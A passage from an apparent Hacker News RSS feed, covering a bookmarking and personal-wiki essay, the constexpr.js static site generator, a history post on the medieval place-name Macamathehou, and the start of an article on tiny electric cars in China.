<li><p>To create a <a href="https://en.wikipedia.org/wiki/Getting_Things_Done#Workflow">Someday/Maybe</a> or Read It Later list. This link is something that looked interesting to you, but wasn’t interesting enough for you to read at the time. Some of these items will actually get read at some point, but many more will not. There’s an element of hoarding to collecting these kind of bookmarks. I think it stems in part from a sort of anxiety rooted in <a href="https://en.wikipedia.org/wiki/Fear_of_missing_out">the belief that you might be missing out on something</a>. In this case, missing out on access to the knowledge contained in the bookmarked resource.</p>
<p>I try to avoid making these <abbr title="Fear Of Missing Out">FOMO</abbr> bookmarks, because they just sit there, not getting read, but still taking up space and mental bandwidth every time you look at your bookmarks and see them, and once again promise yourself, “Someday…”</p></li>
<li><p>To create references, sources, and quotes that you will refer back to in your own writing or in the course of your own work. This kind of bookmarking feels more “correct” to me. Or at least much more useful and more productive.</p></li>
</ol>
<h2 id="more-on-type-2-bookmarks">More On Type 2 Bookmarks</h2>
<p>The primary value in a type 2 bookmark is, again, extracting content from it. Creating a reference and a context.</p>
<p>The ability to comment on or annotate a bookmark is a feature I have seen absolutely nowhere since the old days of Google Reader.</p>
<p>There was a redditor I saw commenting on current events stories around 2016 - 2017 who must have had a fantastic Type 2 Bookmarking workflow. The remarkable thing about their posts is that nearly every single <em>sentence</em> would have between 1 - 3 citations to a variety of news sources backing up their claims.</p>
<p>A simple collection of links wouldn’t allow for such recall. They must have had snippets and summaries ready to go for each topic on which they commented.</p>
<p>It is this sort of “Type 2” content that I’ve been collecting from all the books I’ve read the past few years. I have found this process of note taking to be so useful that I have finally come to consider reading books a waste of time unless I do it.</p>
<p>Unless, that is, I am reading for leisure, in which case I rarely care whether I can remember the particulars of the content in a month’s time. The point of reading such a book is to experience the feelings of having read it. Not to absorb any factual content from it.</p>
<p>But if it’s a book that I’m reading to gain practical knowledge and know-how, then of course, most certainly, if that knowledge and know-how fades over the course of a couple months to a year, then how is it not wasted time?</p>
<p>The same holds true of bookmarks. If you don’t capture some kind of content or context from the bookmarked material, then the bookmark becomes opaque and its significance, meaning, and value degrades with time.</p>
<p>That’s one of the reasons that Type 1 / FOMO bookmarks so rarely get read.</p>
<h2 id="deplatforming-my-bookmarks">Deplatforming my bookmarks</h2>
<p>So here’s an endeavor that I’ve been undertaking for the last couple of weeks.</p>
<p>I am deplatforming my bookmarks.</p>
<p>What this looks like is going through all the platforms I mentioned above, and assessing all of my saved items, and then migrating <em>content</em> to a single knowledge database.</p>
<p>Type 1 bookmarks are for the most part simply deleted. If I haven’t read them by now, I ain’t gonna.</p>
<p>Type 2 bookmarks are reevaluated for their content. Useful, interesting content that I will want to refer back to is entered into <a href="https://github.com/chrisman/knowledge/wiki">my personal wiki</a>, and the bookmark is added as a source for that content.</p>
<p>This immediately feels so much better! I’m no longer collecting opaque URLs. I am collecting <em>information</em> and <em>content</em> and the links are a side effect and a source for that content.</p>
<p>My “tags” are pages in my wiki. “Bundles” emerge through linking pages. It’s easier to see and follow links between concepts. And concepts gain depth and validity as more sources are added.</p>
<p>The additional benefits of keeping all this content in a GitHub wiki include:</p>
<ol type="1">
<li><p>git: having all my info in version control and on multiple computers, with access to command line tools to search and format text.</p></li>
<li><p>web access: the added convenience of web interface, so I can edit and view in the browser and on mobile.</p></li>
</ol>
<h2 id="conclusion">Conclusion</h2>
<p>I’ll probably continue to use something like Pocket to form a queue of content to be processed. Because putting the content in the knowledge base is certainly more work than the one-click “save to pocket” feature in my browser. But I intend to continue with this exercise because it feels really great.</p>
<p>So allow me to revize my requirements of a bookmarking system, and to evaluate this new systems by these requirements:</p>
<ol type="1">
<li><p>Centralized: no more searching through multiple sites to find the reference I’m looking for.</p>
<p>Score: Passing, with a qualifier. It offers the <em>promise</em> of a fully centralized collection, but there is still the process of deplatforming that content, because honestly I’m still going to save stuff on reddit and on pocket for the sake of ease and convenience.</p></li>
<li><p>Simple: be able to capture a bookmark quickly and easily.</p>
<p>Score: Neutral. Entering content into the knowledge base takes much longer than a single click-to-save. Solution: continue using convenient things like Pocket and Reddit, and continue migrating content from those platforms to the knowledge base. (See point #1 above.)</p></li>
<li><p>Organized: have tags and ideally “bundles” of tags, and the ability to see links and connections between tags.</p>
<p>Score: Passing. Pages and hyperlinks as tags and connections is great so far, and has lead to more connections between ideas.</p></li>
<li><p>Sharing: be able to share tags and content with others.</p>
<p>Score: Passing. Instead of linking to tags, I can share a URL to a page on the wiki. It’s too bad that the “Watch” feature doesn’t (I think) tell people when a wiki is updated. One of the coolest features of old del.icio.us and current pinboard is that every tag has an RSS feed you can subscribe to!</p></li>
</ol>
<p>Total score: passing!</p>
<h2 id="resources">Resources</h2>
<ul>
<li><p>meta-knowledge: a list of people who learn things in public on GitHub.</p>
<p><a href="https://github.com/RichardLitt/meta-knowledge">https://github.com/RichardLitt/meta-knowledge</a></p></li>
<li><p>note taking</p>
<ul>
<li><p>Zettelkasten: a note taking method that HN is obsessed with right now. Originally used index cards, now uses hipster Electron apps.</p>
<p><a href="https://writingcooperative.com/zettelkasten-how-one-german-scholar-was-so-freakishly-productive-997e4e0ca125">https://writingcooperative.com/zettelkasten-how-one-german-scholar-was-so-freakishly-productive-997e4e0ca125</a></p></li>
<li><p>Commonplace Book: a method for collecting, linking, and indexing written notes.</p>
<p><a href="https://publicdomainreview.org/collection/john-lockes-method-for-common-place-books-1685">https://publicdomainreview.org/collection/john-lockes-method-for-common-place-books-1685</a></p></li>
<li><p>Org Mode: included here for completeness. People <a href="https://tiny.tilde.website/@cpb/104230682765018604">do NOT shut up about org mode</a>.</p></li>
</ul></li>
</ul>
</div></div>]]>
            </description>
            <link>https://chrisman.github.io/11.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26233405</guid>
            <pubDate>Tue, 23 Feb 2021 03:00:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Constexpr.js]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26233187">thread link</a>) | @fctorial
<br/>
February 22, 2021 | https://fctorial.github.io/posts/constexpr.js.html | <a href="https://web.archive.org/web/*/https://fctorial.github.io/posts/constexpr.js.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <header>
        <h3 id="main_title">Constexpr.js</h3>
    </header>
    <h4>What is constexpr.js?</h4>
    <p>
        <a href="https://github.com/fctorial/ConstexprJS">constexpr.js</a> is a static site generator which doesn't force you to learn a domain specific language.
        When using this tool, you use javascript and usual DOM manipulation methods to generate the webpage. The tool
        will render the page using chrome, and once it has finished rendering, it will save the rendered state of the
        page as a new html file. This new html file will look exactly like the original page after it has finished rendering.
        For example, the tool converts <a href="https://fctorial.github.io/demos/constexpr.js/input.html">this</a> page into <a href="https://fctorial.github.io/demos/constexpr.js/output.html">this</a> page.
        <br>
        The generated page doesn't have to be completely static. In the above example, the heading is being animated
        with javascript.
    </p>

    <h4>How to use it?</h4>

    <p>
        You will have to divide the javascript being used in your page into two groups. Runtime javascript and
        compile time javascript, and annotate all compile time script tags with <progi>constexpr</progi> attribute:
        <prog>
<span><span><span>&lt;</span>script</span> <span>constexpr</span><span>&gt;</span></span><span><span>
    <span>...</span>
</span></span><span><span><span>&lt;/</span>script</span><span>&gt;</span></span>
<span><span><span>&lt;</span>script</span> <span>constexpr</span> <span>src</span><span><span>=</span><span>"</span>/generate_page.js<span>"</span></span><span>&gt;</span></span><span></span><span><span><span>&lt;/</span>script</span><span>&gt;</span></span>
        </prog><br>
        Runtime code must not depend on the compile time code, since that code will be stripped out before writing the output file.
    </p>

    <p>
        Once the HTML generation code has finished rendering, it must call the <progi>window._ConstexprJS_.compile()</progi>
        function. This function is injected into the page by the compiler.
    </p>

    <p>
        The compiler can be installed like this: <prog><span>npm</span> i -g constexpr.js</prog><br>

        Command line usage:
        <prog>constexpr.js --input<span>=</span><span>"&lt;input_directory&gt;"</span> --output<span>=</span><span>"&lt;output_directory&gt;"</span> <span>[</span>--exclusions<span>=</span>path1:path2<span>]</span> <span>[</span>--verbose<span>]</span> <span>[</span>--jobs<span>=</span>n<span>]</span> <span>[</span>--noheadless<span>]</span> <span>[</span>--jobtimeout<span>]</span> <span>[</span>--depfile<span>=</span><span>&amp;</span>depfile<span>&gt;</span><span>]</span></prog><br>

        A json object with the command line args, compilation results and dependencies will be written to the path specified by <progi>--depfile</progi> option.
        <br>
        The tool also copies resources (<progi>css</progi>, <progi>images</progi> etcetra)
        that are requested by pages being rendered. HTML files/resources inside paths given in <progi>--exclusions</progi> are not processed/copied.
    </p>

    <h4>Notes</h4>

    <ol>
        <li>
            You can use any web development technology (and any number of technologies) to generate the html without any fear
            of bloat. Just make sure that <progi>window._ConstexprJS_.compile()</progi> is called <span>after</span>
            the page has finished rendering.
            <p>
            
            Pivottable.js demo:
            </p><div id="pt_output"><table data-numrows="4" data-numcols="4"><thead><tr><th colspan="2" rowspan="1"></th><th>day</th><th colspan="1" rowspan="2">Fri</th><th colspan="1" rowspan="2">Sat</th><th colspan="1" rowspan="2">Sun</th><th colspan="1" rowspan="2">Thur</th><th rowspan="2">Totals</th></tr><tr><th>sex</th><th>smoker</th><th></th></tr></thead><tbody><tr><th rowspan="2">Female</th><th rowspan="1" colspan="2">No</th><td data-value="6.25">6.25</td><td data-value="35.42">35.42</td><td data-value="46.61">46.61</td><td data-value="61.49">61.49</td><td data-value="149.77" data-for="row0">149.77</td></tr><tr><th rowspan="1" colspan="2">Yes</th><td data-value="18.78">18.78</td><td data-value="43.03000000000001">43.03</td><td data-value="14">14.00</td><td data-value="20.930000000000003">20.93</td><td data-value="96.74" data-for="row1">96.74</td></tr><tr><th rowspan="2">Male</th><th rowspan="1" colspan="2">No</th><td data-value="5">5.00</td><td data-value="104.21000000000001">104.21</td><td data-value="133.96000000000004">133.96</td><td data-value="58.83">58.83</td><td data-value="302" data-for="row2">302.00</td></tr><tr><th rowspan="1" colspan="2">Yes</th><td data-value="21.93">21.93</td><td data-value="77.73999999999998">77.74</td><td data-value="52.82">52.82</td><td data-value="30.58">30.58</td><td data-value="183.07" data-for="row3">183.07</td></tr><tr><th colspan="3">Totals</th><td data-value="51.96" data-for="col0">51.96</td><td data-value="260.4" data-for="col1">260.40</td><td data-value="247.39000000000007" data-for="col2">247.39</td><td data-value="171.83" data-for="col3">171.83</td><td data-value="731.58">731.58</td></tr></tbody></table></div>
            <br>
            This page also uses prism.js for syntax highlighting.
        </li>
        <li>
            You can mark tags other than <progi>script</progi> with <progi>constexpr</progi> as well.
            In the above example, the box at the top is marked constexpr, so it isn't present in the output page.
            This can be used to differentiate original website from generated website:
            <prog>
<span><span><span>&lt;</span>style</span> <span>constexpr</span><span>&gt;</span></span><span><span>
<span>body</span> <span>{</span>
    <span>border</span><span>:</span> 2px solid red<span>;</span>
<span>}</span>
</span></span><span><span><span>&lt;/</span>style</span><span>&gt;</span></span>
            </prog>
        </li>
        <li>
            Client code in the page can signal the compiler to skip the current file by calling <progi>window._ConstexprJS_.abort(message)</progi>.
        </li>
        <li>
            In the original webpage, you'll see a console error when the code tries to call the compilation trigger function,
            since that function is injected by the compiler. You can add this snippet near the top to fix that error:

            <prog>
<span>&lt;</span>script constexpr<span>&gt;</span>
  <span>if</span> <span>(</span><span>!</span>window<span>.</span>_ConstexprJS_<span>)</span> <span>{</span>
    window<span>.</span>_ConstexprJS_ <span>=</span> <span>{</span>
      <span>compile</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span><span>}</span><span>,</span>
      <span>abort</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span><span>}</span>
    <span>}</span>
  <span>}</span>
<span>&lt;</span><span>/</span>script<span>&gt;</span>
            </prog>
        </li>
        <li>
            There might be multiple rendering tasks running in your page. You can manage all those tasks using <a href="https://github.com/fctorial/fctorial.github.io.src/blob/master/static/js/constexpr/index.js">this</a>
            refcounting mechanism.

            All the tasks will call <progi>startLoading()</progi> when they begin loading, and <progi>endLoading()</progi>
            when they've finished loading. The compilation will be triggered when all the tasks have finished.
        </li>
        <li>
            You should keep all list data separate from the html in <a href="https://github.com/fctorial/fctorial.github.io.src/tree/master/collections">json files</a>.
            <progi>constexpr</progi> code in the html will fetch these json files and render the page using them.
            The directory containing this data should be excluded using <progi>--exclusions</progi> flag, so that the
            resources inside it aren't copied over.
        </li>
        <li>
            You can include dev utilites like <a href="https://github.com/fctorial/fctorial.github.io.src/blob/master/static/js/constexpr/nav.js#L19">this</a> in the
            original website. It reloads the page whenever it's focused. It won't be in the output since it's used as constexpr.
        </li>
        <li>
            This whole website is rendered using javascript and constexpr.js. Nothing other than the demo uses runtime javascript:
            <prog>
$ tokei -t=javascript
===============================================================================
Language            Files        Lines         Code     Comments       Blanks
===============================================================================
JavaScript              1            2            1            0            1
===============================================================================
Total                   1            2            1            0            1
===============================================================================
            </prog>
            The original sources can be found <a href="https://github.com/fctorial/fctorial.github.io.src">here</a>.
        </li>
    </ol>
</article></div>]]>
            </description>
            <link>https://fctorial.github.io/posts/constexpr.js.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26233187</guid>
            <pubDate>Tue, 23 Feb 2021 02:24:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Macamathehou in Lincolnshire and people named Muhammad in medieval England]]>
            </title>
            <description>
<![CDATA[
Score 34 | Comments 18 (<a href="https://news.ycombinator.com/item?id=26232817">thread link</a>) | @pepys
<br/>
February 22, 2021 | https://www.caitlingreen.org/2021/01/macamathehou-in-lincolnshire.html | <a href="https://web.archive.org/web/*/https://www.caitlingreen.org/2021/01/macamathehou-in-lincolnshire.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-body-4764828100605476219" itemprop="description articleBody">
<p>The aim of the following draft is to offer some thoughts on a local name from thirteenth-century Lincolnshire, <i>Macamathehou</i>, that involves a version of the Arabic name Muhammad (Middle English <i>Makomet/Macamethe</i>, Old French <i>Mahomet</i>). Whilst it has been plausibly seen as an instance of a variant of the name of Muhammed being used to mean 'heathen', 'pagan idol' or similar (based on the false but common medieval Christian belief that the prophet Muhammad was worshipped as a god), here in reference to a barrow that was considered to be a pre-Christian site, it is worth noting that there are a small number of people with names and surnames derived from Arabic <i>Muḥammad</i> apparently living in twelfth- to fourteenth-century England.</p><table><tbody><tr><td><a href="https://1.bp.blogspot.com/-w4ER6e7-JsI/X7AZDfw1bCI/AAAAAAADLhw/ULvdpDuWKwAelDOKu23y5ZJFgTBdhTdMgCLcBGAsYHQ/s879/macamathehou-large.jpg"><img data-original-height="355" data-original-width="500" src="https://1.bp.blogspot.com/-hhv-Lu79n_o/X7AZDcDbe6I/AAAAAAADLhs/RS2oeTJ3IocU1SGmohUZdB7Q-nFhCH-sgCLcBGAsYHQ/s16000/macamathehou-500.jpg"></a></td></tr><tr><td><i>Figure 1: the location of Macamathehou between Spridlington and Faldingworth parishes in Lincolnshire; click the image or <a href="https://1.bp.blogspot.com/-w4ER6e7-JsI/X7AZDfw1bCI/AAAAAAADLhw/ULvdpDuWKwAelDOKu23y5ZJFgTBdhTdMgCLcBGAsYHQ/s879/macamathehou-large.jpg">here</a> for a larger version (image: C. R. Green/OpenStreetMap and its contributors).</i><i>&nbsp;</i></td></tr></tbody></table>
<p>The existence of the intriguing local name <i>Macamathehou</i> in the parish of Spridlington, Lincolnshire, was first noted in 2001 by Kenneth Cameron, John Field and John Insley in <i>Place-Names of Lincolnshire VI </i>(<i>PNL</i>), with both attestations of the name dating from the thirteenth century (the reign of King Henry III, 1216–72).(<a href="https://www.caitlingreen.org/2021/01/macamathehou-in-lincolnshire.html#fn1">1</a>) They identify the two elements of the name as being Old Norse <i>haugr</i>, 'mound, barrow', and Middle English <i>Makomet/Macamethe</i>, which derives from the name of the prophet Muhammad (Medieval Latin <i>Machometus/Mahumetus</i>, Anglo-Norman <i>Mahumet/Mahomet/Machomete</i>, Old French <i>Mahomet</i> &lt; Arabic <i>Muḥammad</i>, probably via an Arabic regional form <i>Maḥammad</i>).(<a href="https://www.caitlingreen.org/2021/01/macamathehou-in-lincolnshire.html#fn2">2</a>) Needless to say, this solution is most intriguing and has, moreover, found favour with other place-name specialist, including the <i>Vocabulary of English Place-Names </i>(<i>VEPN</i>) and Richard Coates.(<a href="https://www.caitlingreen.org/2021/01/macamathehou-in-lincolnshire.html#fn3">3</a>)</p><p>As to the import of this name, the easiest conclusion—and the one endorsed by&nbsp;<i>PNL</i>, <i>VEPN</i>&nbsp;and Coates—is that the first element, <i>Macamethe/</i><i>Maumate</i> etc, is not functioning simply as a normal Middle English rendering of the name Muhammad/<i>Mahomet</i>, but rather as a word indicative of heathen or pagan idolatry, based on the false but common medieval Christian belief that the prophet Muhammad was worshipped as a god. So, <i>PNL </i>describes the name as meaning 'the heathen mound', with the first element being 'a corrupt ME [Middle English] form of the name of the prophet Mohammed, for which <i>v.</i>&nbsp;MED [<i>Middle English Dictionary</i>], s.v. <i>Makomete</i>, also used to denote a pagan god or an idol'.(<a href="https://www.caitlingreen.org/2021/01/macamathehou-in-lincolnshire.html#fn4">4</a>) This is taken up by Richard Coates, who says that it has been suggested, 'with great plausibility', that <i>Macamathehou </i>in Spridlington parish 'is a Middle English name meaning "Mahomet mound", i.e. "heathen mound"', and points to 'the repeated compound of OE <i>hæðen </i>+ <i>byrgels "</i>heathen burial"' as a potential comparison.(<a href="https://www.caitlingreen.org/2021/01/macamathehou-in-lincolnshire.html#fn5">5</a>) Likewise, the <i>VEPN</i>'s draft section on M includes the following discussion:</p>

<blockquote><b>makomet </b>ME, 'idol, pagan god', an application of the name of the Arab prophet Mohammed (commonly though mistakenly believed by medieval Christians to have been worshipped as a god)... It occurs early in
<i>Macamathehou </i>(f.n.) 1216–72 L:6·211 (<b>haugr</b>), presumably to be
interpreted as 'heathen mound'.(<a href="https://www.caitlingreen.org/2021/01/macamathehou-in-lincolnshire.html#fn6">6</a>)</blockquote>
<p>On the whole, this interpretation is probably the safest option. There are certainly a handful of references to 'heathen' barrows in Old English charter bounds, for example <i>of leofwynne mearce to þam hæþenan beorge</i>, 'from Leofwine's boundary to the heathen barrow', in the charter S956 relating to Drayton, Hampshire, and dated AD 1019, although none are recorded from Lincolnshire.(<a href="https://www.caitlingreen.org/2021/01/macamathehou-in-lincolnshire.html#fn7">7</a>) It has also been suggested that the Lincolnshire names Bloater Hill (North Willingham) and Blod Hou (Barrow-on-Humber) derive from Old Norse <i>blóthaugr</i>, 'a sacrificial mound', whilst other names involving <i>haugr</i> certainly refer to supernatural/demonic creatures—for example, <i>Gasthehowe</i>/<i>Gastehowe</i>, Ashby Puerorum (Lincolnshire), recorded in the thirteenth century and deriving from Middle English <i>gast</i>/Old English <i>gāst</i>, 'ghost, dead-spirit', or names like Scratters (<i>Scrathou</i>, in Hayton, East Riding of Yorkshire) and Scrathowes (<i>Scrathou</i>, in Osmotherley, North Riding of Yorkshire), which derive from Old Norse <i>skratti</i>, 'devil, wizard'&nbsp;+ <i>haugr</i>.(<a href="https://www.caitlingreen.org/2021/01/macamathehou-in-lincolnshire.html#fn8">8</a>) Furthermore, the Old English compound <i>hæðen&nbsp;</i>+ <i>byrgels</i>, 'heathen burial', does indeed recur frequently in Late Saxon charter bounds, with these names often said to be identifiable with barrows in the landscape.(<a href="https://www.caitlingreen.org/2021/01/macamathehou-in-lincolnshire.html#fn9">9</a>)</p><p>On the other hand, there are some possible issues with this explanation, and other interpretations are possible of Spridlington's <i>Macamathehou</i>. First, the comparison with the many instances of the OE compound <i>hæðen </i>+ <i>byrgels</i>, ‘heathen burial’, is perhaps not as convincing as it might seem. Not only is a link between this term and barrows only demonstrable in a handful of instances, but Andrew Reynolds has also suggested that the sense of the term was primarily not ‘pagan’, but rather ‘unconsecrated’, and that it denoted burials of executed offenders and other social outcasts, which renders the proposed value of these names as support for interpreting <i>Macamathehou&nbsp; </i>as meaning ‘heathen mound’ open to significant debate.(<a href="https://www.caitlingreen.org/2021/01/macamathehou-in-lincolnshire.html#fn10">10</a>) Second, if the above is correct, then this would be the only known instance of a derivative of the Arabic name Muhammad being used in a place-name to indicate a 'heathen mound' or similar, which is potentially concerning—the other elements noted above all recur in multiple names. Third, the element identified by <i>PNL </i>and <i>VEPN</i> as being present in <i>Macamethehou</i> is Middle English <i>Makomet(e)</i>. The <i>Middle English Dictionary</i> (<i>MED</i>) on <i>Makomet(e)/</i><i>Macamethe</i> etc, however, makes it clear that the primary use of this word in Middle English is as a form of the name Muhammad, not as a word referring to an 'idol'/'pagan god', with the vast majority of quotations provided by the <i>MED </i>referring either the prophet Muhammad or people named Muhammad; the only exceptions are a single quotation from Layamon's <i>Brut </i>(<i>c.</i>&nbsp;1200, <i>mahimet</i>, lacking the <i>-c-</i>), and three from two later texts.(<a href="https://www.caitlingreen.org/2021/01/macamathehou-in-lincolnshire.html#fn11">11</a>) The form of the name Muhammad that <i>was </i>primarily—although not exclusively—used in the sense 'pagan deity, idol', is rather <i>Maumet/Maumate</i>, mentioned above, deriving from Anglo-Norman <i>Maumet</i>, a reduced form of <i>Mauhoumet</i>, Old French <i>Mahomet/Mahommet</i>.(<a href="https://www.caitlingreen.org/2021/01/macamathehou-in-lincolnshire.html#fn12">12</a>)</p>
<p>In this light, it is worth considering whether it is possible that the name <i>Macamathehou</i> could somehow be named from a person named <i>Makomet</i>/Muhammad or similar living in medieval England. Certainly, it should be noted that multiple local names relating to mounds/barrows do seem to be named after people who owned estates or land in the area. For example, Andrew Reynolds draws attention to the bounds of a mid-tenth-century charter for Swallowcliffe, Wiltshire (S468), that records the burial site of a seventh‐century woman whose grave had been cut into an existing mound as <i>Posses hlaew</i>, noting that 'Poss is a male name, and thus the mound is apparently not named after its Anglo‐Saxon occupant', implying that it was instead named after a later estate owner.(<a href="https://www.caitlingreen.org/2021/01/macamathehou-in-lincolnshire.html#fn13">13</a>) As Irene Bower long ago pointed out, such a situation can be credibly paralleled in Lincolnshire, with a number of Lincolnshire names involving <i>haugr</i> seeming to contain the same personal-name as is found in the same or a neighbouring parish-name—so, <i>Scalehau </i>(<i>Skalli </i>+ <i>haugr</i>) was located near to Scawby (<i>Skalli</i>&nbsp;+ <i>bȳ</i>), with Kenneth Cameron commenting that the two were 'no doubt named from the same man'; <i>Leggeshou</i> (<i>Leggr </i>+ <i>haugr</i>) was located on the boundary of Legsby parish (<i>Leggr&nbsp;</i>+ <i>bȳ</i>); <i>Katehou/Catehowe </i>(<i>Kati</i>&nbsp;+ <i>haugr</i>) was located in South Cadeby (<i>Kati&nbsp;</i>+ <i>bȳ</i>); and a <i>Grimaldeshawe</i> (<i>Grimaldi </i>+ <i>haugr</i>) was recorded in the neighbouring parish to Grimoldby (<i>Grimaldi</i>&nbsp;+&nbsp;<i>bȳ</i>), perhaps on the boundary between the two.(<a href="https://www.caitlingreen.org/2021/01/macamathehou-in-lincolnshire.html#fn14">14</a>)</p><table><tbody><tr><td><a href="https://1.bp.blogspot.com/-Nu02Jqw5h14/X7WB-D0A8sI/AAAAAAADLvg/p_vwSAkF6RQX5KkB8XMvM6WiC4a1eyI5gCLcBGAsYHQ/s1296/PipeRoll-Mahumet1160-1.jpg"><img data-original-height="216" data-original-width="500" src="https://1.bp.blogspot.com/-VAcqNuGj78U/X7WB-YLMzBI/AAAAAAADLvk/_TLGpi35Olg-dWNhgmcuMcZSaz-qhCgdACLcBGAsYHQ/s16000/PipeRoll-Mahumet1160-1-500.jpg"></a></td></tr><tr><td><i>Figure 2: Section from the Pipe Roll Society publication of&nbsp;The Great Roll of the Pipe for the Seventh Year of the Reign of King Henry the Second, A.D. 1160–1161 (London: Wyman &amp; Sons, 1885), p. 10, dealing with Mahumet of Wiltshire (image: <a href="https://archive.org/details/piperollsociety04pipeuoft/page/10/mode/2up">Internet Archive</a>).</i></td></tr></tbody></table><p>As to the likelihood of someone named Muhammad or one of its Anglo-Norman/Middle English variants (<i>Mahumet</i>,<i> Makomet</i> and similar) actually living in medieval England, this is perhaps less far-fetched than might be assumed. Katharine Keats-Rohan and John Moore have directed attention to the Wiltshire entries of five consecutive Pipe Rolls of Henry II (1160/61–1164/65) that refer to a man named <i>Mahumet, </i>whose name-form Moore considers very difficult to explain as anything other than a rendering of Muhammad and which is accepted as such by the <i>OED </i>and <i>MED</i>. This <i>Mahumet </i>is recorded in the Pipe Rolls only because he was fined for his part in an unlicensed duel with a John de Merleberge, probably in or near Marlborough Castle, and it seems he was not an especially wealthy man, as he was pardoned the last mark of his fine due to his poverty.(<a href="https://www.caitlingreen.org/2021/01/macamathehou-in-lincolnshire.html#fn15">15</a>) Furthermore, <i>Mahumet</i> of Wiltshire was not the only man with this name for whom we have evidence from medieval England. For example, a Theobald <i>filius Mahumet</i> (or <i>filius Mahomet</i>) is recorded from early thirteenth-century Hampshire in the Pipe Rolls of Henry III for 1222–24; another man named <i>Mahomet </i>is recorded in 1327, when Edward III issued him and six others a pardon at Newton-on-Ouse, Yorkshire, for 'offenses in Ireland'; and a <i>Mahummet Saraceno</i>&nbsp;occurs in the Close Rolls of Henry III for 1254. Furthermore, a number of people surnamed <i>Mahumet </i>and similar are recorded in documents of the twelfth and thirteenth centuries, for example a Humphrey Mahumet in a charter of Southwick Priory, Hampshire, a Herbert Maumet who was sergeant of Portsmouth in the mid-thirteenth century, and a Radulphus Maumet who is recorded in the reign of King John.(<a href="https://www.caitlingreen.org/2021/01/macamathehou-in-lincolnshire.html#fn16">16</a>) Moore also notes the presence of someone bearing another 'apparent Arab name' in twelfth-century Hampshire, a certain <i>Paucamatus</i>, a name that he considers to probably reflect <i>Bakmat</i>, who is recorded in Winchester from 1159/60 until 1183/4 and who is associated with …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.caitlingreen.org/2021/01/macamathehou-in-lincolnshire.html">https://www.caitlingreen.org/2021/01/macamathehou-in-lincolnshire.html</a></em></p>]]>
            </description>
            <link>https://www.caitlingreen.org/2021/01/macamathehou-in-lincolnshire.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26232817</guid>
            <pubDate>Tue, 23 Feb 2021 01:20:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The road to electric is filled with tiny cars]]>
            </title>
            <description>
<![CDATA[
Score 84 | Comments 102 (<a href="https://news.ycombinator.com/item?id=26232760">thread link</a>) | @jimmy2020
<br/>
February 22, 2021 | https://restofworld.org/2021/tesla-vs-tiny-cars/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2021/tesla-vs-tiny-cars/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

			<!-- Article Start -->
			
<p><span>I</span>n Beijing’s southwestern outskirts, past a four-lane overpass with sidewalks as wide as the streets themselves, is Zhengyang Road. It has the usual banks, small convenience stores, and noodle houses of many areas in the capital, but it is set apart by a row of about a dozen shops all selling the same thing — tiny electric cars. The cars look, variously, like small Range Rovers, golf carts, trolley cars, or rickshaws with sheet-iron sides, and they are slow. Their fundamental attraction is their price — between $600 and $2,500 — and that drivers can charge them the same way they would a cell phone. They also come with the perks of being loosely regulated. These low-speed electric cars, nicknamed “elderly transport vehicles,” have an enormous market, made up mostly of people who earn very little. And in China, there are a lot of them — <a href="http://english.www.gov.cn/premier/news/202005/29/content_WS5ed058d2c6d0b3f0e9498f21.html">more than 40%</a> of the population, or some 600 million people, make around $150 per month.</p>



<p>On a Sunday afternoon in October, Zhengyang Road is filled with potential customers chatting with store owners.<strong> </strong>Outside a shop with a worn sign, a young couple with a child are in the midst of a heated conversation.<strong> </strong>They came on an electric scooter and are debating whether to leave with a tiny car.</p>



<p>“Don’t we need one for school pickups?” the woman argues. “The children won’t have to put up with the cold in winter.” Her scooter offers no protection from the weather other than oven-mitt-like gloves secured to its handlebars. Her husband counters, “The 1,000 renminbi [$150] quote was for normal batteries, but lithium ones can be five times that. Can’t you just add a windshield to your scooter instead?” The shop owner shows them a cheaper model — which is cheaper because it has no roof. He suggests putting a plastic covering on top.</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_25-40x27.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_25-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_25-400x267.jpg 400w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_25-600x400.jpg 600w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_25-1000x667.jpg 1000w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_25-1600x1067.jpg 1600w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_25-2800x1868.jpg 2800w, " sizes="(max-width: 640px) 100vw, 600px(max-width: 992px) calc(100vw - 40px), (max-width: 1140px) calc(100vw - 290px), calc(100vw - ((100vw - 640px)/2))" alt="A woman exits a tiny car near a subway station in Beijing.">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


